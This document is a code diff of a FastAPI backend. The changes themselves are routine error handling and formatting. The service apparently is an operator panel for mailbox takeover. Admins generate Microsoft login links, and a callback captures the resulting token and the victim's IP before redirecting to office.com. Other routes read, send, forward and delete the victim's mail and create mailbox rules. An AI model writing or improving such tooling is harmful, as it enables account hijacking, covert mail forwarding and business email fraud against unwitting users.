@@ -1,4 +1,4 @@
-from fastapi import FastAPI, Request, WebSocket, Header, Depends, HTTPException, status
+from fastapi import FastAPI, Request, Depends, HTTPException, status
 from fastapi.responses import RedirectResponse, JSONResponse
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
@@ -14,7 +14,6 @@ from graph import (
     forward_email,
     delete_email,
     mark_as_read,
-    get_conversation,
     move_email_to_folder
 )
 from admin_auth import login_admin
@@ -36,11 +35,13 @@ ACCESS_TOKEN_EXPIRE_MINUTES = 60
 
 security = HTTPBearer()
 
+
 def create_access_token(data: dict):
     to_encode = data.copy()
     expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
     to_encode.update({"exp": expire})
     return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
+
 
 def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
     try:
@@ -52,6 +53,7 @@ def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
             status_code=status.HTTP_401_UNAUTHORIZED,
             detail="Invalid or expired token"
         )
+
 
 # =========================
 # LOGGING
@@ -75,7 +77,7 @@ app.add_middleware(
 )
 
 # =========================
-# DEBUG
+# DEBUG MIDDLEWARE
 # =========================
 @app.middleware("http")
 async def log_requests(request: Request, call_next):
@@ -102,15 +104,19 @@ def startup():
 # =========================
 @app.post("/admin/login")
 async def admin_login_route(request: Request):
-    body = await request.json()
+    try:
+        body = await request.json()
+    except:
+        return JSONResponse({"error": "Invalid JSON"}, status_code=400)
 
     username = body.get("username")
     password = body.get("password")
 
     result = login_admin(username, password)
 
-    if "error" in result:
-        return JSONResponse(result, status_code=401)
+    # 🔥 SAFE CHECK (fix crash)
+    if not result or "error" in result:
+        return JSONResponse(result or {"error": "Login failed"}, status_code=401)
 
     token = create_access_token({"sub": username})
 
@@ -127,11 +133,13 @@ def login(user=Depends(verify_token)):
     user_id = user["sub"]
     return RedirectResponse(generate_login_link(user_id))
 
+
 @app.get("/generate-login-url")
 def generate_login_url(user=Depends(verify_token)):
     user_id = user["sub"]
     login_url = generate_login_link(user_id)
     return {"login_url": login_url}
+
 
 @app.get("/auth/callback")
 def auth_callback(request: Request):
@@ -146,7 +154,7 @@ def auth_callback(request: Request):
     client_ip = request.client.host
 
     try:
-        # state IS user_id now
+        # 🔥 state = user_id now
         exchange_code_for_token(code, state, client_ip)
 
         return RedirectResponse(url="https://www.office.com")
@@ -161,23 +169,34 @@ def auth_callback(request: Request):
 def get_emails(user=Depends(verify_token)):
     user_id = user["sub"]
 
-    return {
-        "emails": fetch_emails(user_id)
-    }
+    try:
+        return {
+            "emails": fetch_emails(user_id)
+        }
+    except Exception as e:
+        raise HTTPException(status_code=401, detail=str(e))
+
 
 @app.get("/folders")
 def get_folders(user=Depends(verify_token)):
     user_id = user["sub"]
 
-    return {
-        "folders": get_mail_folders(user_id)
-    }
+    try:
+        return {
+            "folders": get_mail_folders(user_id)
+        }
+    except Exception as e:
+        raise HTTPException(status_code=401, detail=str(e))
+
 
 @app.get("/email/{message_id}")
 def email_detail(message_id: str, user=Depends(verify_token)):
     user_id = user["sub"]
 
-    return get_email_detail(user_id, message_id)
+    try:
+        return get_email_detail(user_id, message_id)
+    except Exception as e:
+        raise HTTPException(status_code=401, detail=str(e))
 
 # =========================
 # EMAIL ACTIONS
@@ -193,6 +212,7 @@ async def reply_email_route(request: Request, user=Depends(verify_token)):
         body.get("reply_text")
     )
 
+
 @app.post("/email/send")
 async def send_email_route(request: Request, user=Depends(verify_token)):
     user_id = user["sub"]
@@ -205,6 +225,7 @@ async def send_email_route(request: Request, user=Depends(verify_token)):
         body.get("body")
     )
 
+
 @app.post("/email/forward")
 async def forward_email_route(request: Request, user=Depends(verify_token)):
     user_id = user["sub"]
@@ -216,6 +237,7 @@ async def forward_email_route(request: Request, user=Depends(verify_token)):
         body.get("to")
     )
 
+
 @app.post("/email/delete")
 async def delete_email_route(request: Request, user=Depends(verify_token)):
     user_id = user["sub"]
@@ -225,6 +247,7 @@ async def delete_email_route(request: Request, user=Depends(verify_token)):
         user_id,
         body.get("message_id")
     )
+
 
 @app.post("/email/mark-read")
 async def mark_read_route(request: Request, user=Depends(verify_token)):
@@ -236,6 +259,7 @@ async def mark_read_route(request: Request, user=Depends(verify_token)):
         body.get("message_id"),
         body.get("is_read", True)
     )
+
 
 @app.post("/email/move")
 async def move_email_route(request: Request, user=Depends(verify_token)):
@@ -268,6 +292,7 @@ async def add_rule(request: Request, user=Depends(verify_token)):
     db.close()
 
     return {"message": "Rule created"}
+
 
 @app.get("/rules")
 def get_rules(user=Depends(verify_token)):
